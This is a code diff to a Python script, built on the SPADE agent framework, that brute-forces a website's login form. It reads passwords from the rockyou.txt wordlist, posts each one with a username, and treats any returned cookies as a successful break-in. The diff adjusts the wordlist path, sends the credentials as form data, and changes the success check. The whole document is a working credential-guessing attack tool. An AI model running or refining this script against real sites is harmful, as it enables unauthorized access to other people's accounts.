@@ -1,7 +1,7 @@
 import requests
 from spade import agent, quit_spade
 from spade.behaviour import CyclicBehaviour
-import time
+import time,os
 
 # POST REQUESTS FORMAT OF THE WEBSITE
 
@@ -23,7 +23,8 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
 """
 
 # prepare the list of passwords
-rockyou = open('.\\server\\wordlists\\rockyou.txt')
+print(__file__)
+rockyou = open(".\\wordlists\\rockyou.txt")
 
 # agent class for bruteforcing
 class AgentBruteforce(agent.Agent):
@@ -41,9 +42,10 @@ class AgentBruteforce(agent.Agent):
                 self.params["pass"] = password.strip()
                 print(self.params)
                 # sending bruteforce get request
-                response = requests.post(url=self.url, params=self.params,allow_redirects=False)
+                response = requests.post(url=self.url, data=self.params)
                 cookies = response.cookies
-                if response.status_code == 200:
+                print(cookies)
+                if len(cookies)>0:
                     print(
                         f'website bruteforced successfuly {self.params["uname"]}:{self.params["pass"]}')
                     self.kill()
